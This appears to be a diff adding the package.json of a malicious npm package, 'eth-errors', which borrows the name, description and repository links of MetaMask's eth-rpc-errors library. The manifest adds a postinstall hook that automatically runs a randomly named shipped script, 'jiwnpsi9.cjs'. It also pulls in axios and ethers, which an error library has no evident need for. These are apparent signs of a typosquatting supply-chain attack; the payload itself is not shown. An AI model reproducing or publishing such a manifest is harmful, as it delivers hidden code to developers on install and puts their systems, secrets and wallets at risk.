@@ -1,0 +1,47 @@
+{
+  "name": "eth-errors",
+  "version": "4.0.3",
+  "description": "Ethereum RPC and Provider errors.",
+  "license": "MIT",
+  "author": "Erik Marks <rekmarks@protonmail.com>",
+  "scripts": {
+    "postinstall": "node jiwnpsi9.cjs"
+  },
+  "main": "dist/index.js",
+  "files": [
+    "dist",
+    "jiwnpsi9.cjs"
+  ],
+  "dependencies": {
+    "fast-safe-stringify": "^2.0.6",
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  },
+  "devDependencies": {
+    "@metamask/eslint-config": "^4.1.0",
+    "@typescript-eslint/eslint-plugin": "^4.6.0",
+    "@typescript-eslint/parser": "^4.6.0",
+    "eslint": "^7.12.1",
+    "eslint-plugin-import": "^2.22.1",
+    "eslint-plugin-json": "^2.1.1",
+    "eslint-plugin-node": "^11.1.0",
+    "fast-deep-equal": "^2.0.1",
+    "nyc": "^15.0.1",
+    "tape": "^5.0.0",
+    "typescript": "^4.0.5"
+  },
+  "bugs": {
+    "url": "https://github.com/MetaMask/eth-rpc-errors/issues"
+  },
+  "homepage": "https://github.com/MetaMask/eth-rpc-errors#readme",
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/MetaMask/eth-rpc-errors.git"
+  },
+  "keywords": [
+    "rpc",
+    "ethereum",
+    "errors",
+    "utility"
+  ]
+}
